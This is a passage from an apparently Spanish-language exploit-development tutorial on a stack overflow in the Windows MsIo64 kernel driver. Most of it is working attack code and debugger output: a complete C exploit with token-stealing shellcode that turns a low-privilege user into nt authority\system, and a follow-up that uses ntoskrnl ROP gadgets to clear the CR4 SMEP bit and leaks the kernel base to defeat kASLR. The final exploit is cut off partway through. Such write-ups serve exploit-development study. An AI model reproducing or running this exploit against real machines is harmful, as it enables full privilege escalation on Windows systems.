<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
MsIo64+0x16b9:
fffff806`559116b9 c3              ret
  
</span><span class="ro">0: kd></span><span class="p"> db poi(rsp) L40
000001ba`7a380000  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
000001ba`7a380010  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
000001ba`7a380020  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
000001ba`7a380030  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  </span>
</code></pre></div></div><br>

</section>
<section class="post" id="exploit">
<br><h3 class="post-title">Exploit</h3><br>

<p class="plain-text">Finalmente solo nos queda modificar el <code class="language-plaintext highlighter-rouge">shellcode</code>, para ello utilizaremos un <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/shellcode/token_stealing.asm">token stealing</a>, este shellcode esta diseñado para tomar el token del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> y copiarlo a nuestro proceso actual por lo que deberiamos obtener sus privilegios, luego de ejecutarlo simplemente ejecutaremos una <code class="language-plaintext highlighter-rouge">cmd.exe</code> para obtener una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">120</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="c1">                                     // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov cx, [rdx + 0x1e4]            ; $cx = KernelApcDisable
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="c1">                                     // inc cx                           ; fix value
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rdx + 0x1e4], cx            ; restore value
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rdx, [rdx + 0x90]            ; $rdx = ETHREAD.TrapFrame
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rbp, [rdx + 0x158]           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rdx + 0x168]           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="mi">0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov r11, [rdx + 0x178]           ; $r11 = ETHREAD.TrapFrame.EFlags  
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rsp, [rdx + 0x180]           ; $rsp = ETHREAD.TrapFrame.Rsp
    </span><span class="mi">0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="c1">                                           // xor eax, eax                     ; $eax = STATUS SUCCESS
    </span><span class="mi">0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="c1">                                     // swapgs                           ; swap gs segment
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07</span><span class="c1">                                      // o64 sysret                       ; return to usermode
</span><span class="p">};

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">MsIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 80</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 72</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="o">*</span><span class="p">((</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+</span><span class="mi"> 72</span><span class="p">)) </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);

    CloseHandle(hDevice);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit deberiamos pasar del usuario llamado <code class="language-plaintext highlighter-rouge">user</code> con bajos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios sobre el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.20348.1006]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="smep">
<br><h3 class="post-title">SMEP</h3><br>

<p class="plain-text">El exploit anterior funciona bien sin embargo aún hay algo a tener en cuenta, este corria con la protección <code class="language-plaintext highlighter-rouge">SMEP</code> deshabilitada temporalmente sin embargo a partir de <code class="language-plaintext highlighter-rouge">Windows 8</code> todos los windows actuales lo tienen activado por defecto, entonces veamos que pasa ahora si ejecutamos el exploit, al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> e intentar interpretar la primera instrucción del shellcode nos lanza un <code class="language-plaintext highlighter-rouge">BSOD</code> y este muestra el error <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xfc---attempted-execute-of-noexecute-memory">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</a> y no podemos ejecutarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
MsIo64+0x16b9:
fffff806`559116b9 c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
00000250`51190000 65488b142588010000 mov   rdx,qword ptr gs:[188h]  

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x000000fc (0x0000025051190000,0x000000009BE6A867,0xFFFFEA8F0A7CF020,0x0000000080000005)  

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff801`7e0077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v 
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
An attempt was made to execute non-executable memory.  The guilty driver
is on the stack trace (and is typically the current instruction pointer).
When possible, the guilty driver's name is printed on
the BugCheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: 0000025051190000, Virtual address for the attempted execute.
Arg2: 000000009be6a867, PTE contents.
Arg3: ffffea8f0a7cf020, (reserved)
Arg4: 0000000080000005, (reserved)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/stack-overflow/10.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/10.png"></p></div></a>

<p class="plain-text">El <a href="https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf">SMEP</a> impide que se pueda ejecutar la memoria de modo usuario desde modo kernel, sin embargo esta protección es controlada por el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code> por lo que si cambiamos su valor a <code class="language-plaintext highlighter-rouge">0</code> podriamos deshabilitarlo y ejecutar el shellcode</p>
<a href="/exploit-development/windows-kernel/stack-overflow/11.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/11.png"></p></div></a>

<p class="plain-text">Entonces lo unico que necesitamos es tomar el valor en binario del registro <code class="language-plaintext highlighter-rouge">cr4</code> cambiando el bit <code class="language-plaintext highlighter-rouge">20</code> por <code class="language-plaintext highlighter-rouge">0</code> y obtenemos su valor equivalente en hex a <code class="language-plaintext highlighter-rouge">0x250ef8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> .formats cr4
Evaluate expression:
  Hex:     00000000`00350ef8
  Decimal: 3477240
  Decimal (unsigned) : 3477240
  Octal:   0000000000000015207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000
  Chars:   .....5..
  Time:    Mon Feb  9 23:54:00 1970
  Float:   low 4.87265e-039 high 0
  Double:  1.71798e-317
  
</span><span class="ro">0: kd></span><span class="p"> .formats 0y1001010000111011111000
Evaluate expression:
  Hex:     00000000`00250ef8
  Decimal: 2428664
  Decimal (unsigned) : 2428664
  Octal:   0000000000000011207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00100101 00001110 11111000
  Chars:   .....%..
  Time:    Wed Jan 28 20:37:44 1970
  Float:   low 3.40328e-039 high 0
  Double:  1.19992e-317</span>
</code></pre></div></div><br>

<p class="plain-text">Como no podemos ejecutar shellcode haremos <code class="language-plaintext highlighter-rouge">ROP</code> para cambiar el bit, para hacerlo podemos buscar <code class="language-plaintext highlighter-rouge">gadgets</code> dentro del controlador o el kernel, sin embargo los gadgets del propio driver son bastante limitados por lo que usaremos <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, el primer gadget guarda un qword en <code class="language-plaintext highlighter-rouge">rcx</code> y el segundo mueve el valor de <code class="language-plaintext highlighter-rouge">rcx</code> al registro <code class="language-plaintext highlighter-rouge">cr4</code>, sin embargo aun tenemos un problema bastante importante, la protección <code class="language-plaintext highlighter-rouge">kASLR</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe -I 0x0 --console  
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets for section: .text
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search pop rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x000000000023a028</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search mov cr4, rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov cr4, rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x000000000039f027</span><span class="p">:</span><span class="am"> mov</span><span class="p"> cr4, rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Necesitamos la dirección base del kernel sin embargo esta es bastante facil de obtener con el primer valor del array al utilizar la función <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];  
}</span>
</code></pre></div></div><br>

<p class="plain-text">Después de escribir los <code class="language-plaintext highlighter-rouge">72</code> bytes escribiremos <code class="language-plaintext highlighter-rouge">4 qwords</code>, los primeros 2 guardan el nuevo valor de <code class="language-plaintext highlighter-rouge">cr4</code> en <code class="language-plaintext highlighter-rouge">rcx</code>, el tercero mueve a <code class="language-plaintext highlighter-rouge">cr4</code> el valor en <code class="language-plaintext highlighter-rouge">rcx</code> deshabilitando asi el <code class="language-plaintext highlighter-rouge">SMEP</code> y el ultimo salta al shellcode a ejecutar en el modo usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">72</span><span class="p">);

</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x23a028</span><span class="p">; </span><span class="c1">// pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">  // cr4 value
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x39f027</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;  
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">             // token stealing</span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final deberia bypassear la protección de <code class="language-plaintext highlighter-rouge">SMEP</code> y <code class="language-plaintext highlighter-rouge">kASLR</code> y funcionar en un <code class="language-plaintext highlighter-rouge">windows 10</code> completamente actualizado sin ninguna modificación necesaria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">120</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="c1">                                     // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov cx, [rdx + 0x1e4]            ; $cx = KernelApcDisable
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="c1">                                     // inc cx                           ; fix value
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rdx + 0x1e4], cx            ; restore value
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rdx, [rdx + 0x90]            ; $rdx = ETHREAD.TrapFrame
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rbp, [rdx + 0x158]           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rdx + 0x168]           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="mi">0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov r11, [rdx + 0x178]           ; $r11 = ETHREAD.TrapFrame.EFlags  
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rsp, [rdx + 0x180]           ; $rsp = ETHREAD.TrapFrame.Rsp
    </span><span class="mi">0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="c1">                                           // xor eax, eax                     ; $eax = STATUS SUCCESS
    </span><span class="mi">0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="c1">                                     // swapgs                           ; swap gs segment
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07</span><span class="c1">                                      // o64 sysret                       ; return to usermode
</span><span class="p">};

</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
